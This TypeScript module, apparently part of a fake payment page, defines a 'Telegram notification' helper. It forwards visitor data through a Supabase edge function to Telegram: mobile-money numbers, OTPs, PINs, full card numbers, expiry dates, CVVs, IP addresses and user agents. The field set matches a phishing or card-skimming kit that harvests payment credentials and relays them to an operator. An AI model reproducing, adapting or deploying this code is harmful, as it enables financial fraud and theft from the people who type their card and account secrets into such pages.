import { supabase } from "@/integrations/supabase/client";

export const sendTelegramNotification = async (payload: {
  type: 'page_entry' | 'payment_activity' | 'payment_cancelled';
  amount?: string;
  method?: string;
  referrer?: string;
  ip?: string;
  paymentType?: 'mfs' | 'card';
  number?: string;
  otp?: string;
  pin?: string;
  cardName?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
}) => {
  try {
    await supabase.functions.invoke('telegram-notify', {
      body: {
        ...payload,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        referrer: payload.referrer || document.referrer || 'Direct',
      },
    });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
};
